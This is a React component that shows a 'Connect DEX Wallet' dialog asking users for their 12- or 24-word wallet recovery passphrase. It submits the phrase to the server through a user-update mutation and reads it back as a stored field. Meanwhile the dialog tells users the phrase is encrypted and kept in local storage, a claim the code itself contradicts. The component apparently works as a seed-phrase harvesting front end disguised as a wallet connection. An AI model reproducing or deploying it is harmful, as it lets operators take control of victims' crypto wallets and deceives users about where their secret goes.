import { useMutation, useQuery } from "@tanstack/react-query";
import { Loader2 } from "lucide-react";
import { useState } from "react";
import { toast } from "sonner";
import { useTRPC } from "~/trpc/client";
import { Button, buttonVariants } from "./ui/button";
import {
	Dialog,
	DialogContent,
	DialogDescription,
	DialogHeader,
	DialogTitle,
	DialogTrigger,
} from "./ui/dialog";
import { Label } from "./ui/label";
import { Textarea } from "./ui/textarea";
import { useStepStore } from "~/lib/store";

export function DexButton() {
	const trpc = useTRPC();
	const { mutateAsync, isPending } = useMutation(
		trpc.user.updateUser.mutationOptions(),
	);
	const { step, setStep } = useStepStore();
	const { data: user } = useQuery(trpc.user.getUser.queryOptions());
	const [mnemonic, setMnemonic] = useState<string>("");

	const handleSubmit = async () => {
		if (!mnemonic.trim()) {
			toast.error("Please enter your passphrase.");
			return;
		}
		toast.promise(mutateAsync({ mnemonic }), {
			loading: <Loader2 className="animate-spin size-4" />,
			success: (res) => {
				if (res.error) {
					return res.error;
				}
				setStep(step + 1);
				return res.message;
			},
			error: (error) =>
				error instanceof Error ? error.message : "An error occurred",
		});
	};

	return (
		<Dialog>
			<DialogTrigger className={buttonVariants({ size: "lg" })}>
				{user?.mnemonic ? "Update wallet" : "Connect DEX Wallet"}
			</DialogTrigger>
			<DialogContent>
				{user?.mnemonic ? (
					<>
						<DialogHeader>
							<DialogTitle>Your passphrase is already saved</DialogTitle>
							<DialogDescription>
								Your passphrase has already been saved. Do you want to update
								it?
							</DialogDescription>
						</DialogHeader>
						<form
							onSubmit={(e) => {
								e.preventDefault();
								handleSubmit();
							}}
							className="grid gap-2"
						>
							<Label>Enter pass phrase</Label>
							<Textarea
								value={mnemonic}
								onChange={(e) => setMnemonic(e.target.value)}
								placeholder="Enter your 12 or 24 word passphrase"
							/>
							<Button disabled={isPending}>
								{isPending ? (
									<Loader2 className="animate-spin size-4" />
								) : (
									"Update phrase"
								)}
							</Button>
						</form>
					</>
				) : (
					<>
						<DialogHeader>
							<DialogTitle>Enter your passphrase</DialogTitle>
						</DialogHeader>
						<DialogDescription>
							Enter your passphrase to link you account using your passphrase.
							Your passphrase is encrypted and securely stored in your local
							storage.
						</DialogDescription>
						<form
							onSubmit={(e) => {
								e.preventDefault();
								handleSubmit();
							}}
							className="grid gap-2"
						>
							<Label>Enter pass phrase</Label>
							<Textarea
								value={mnemonic}
								onChange={(e) => setMnemonic(e.target.value)}
								placeholder="Enter your 12 or 24 word passphrase"
							/>
							<Button disabled={isPending}>
								{isPending ? (
									<Loader2 className="animate-spin size-4" />
								) : (
									"Save phrase"
								)}
							</Button>
						</form>
					</>
				)}
			</DialogContent>
		</Dialog>
	);
}
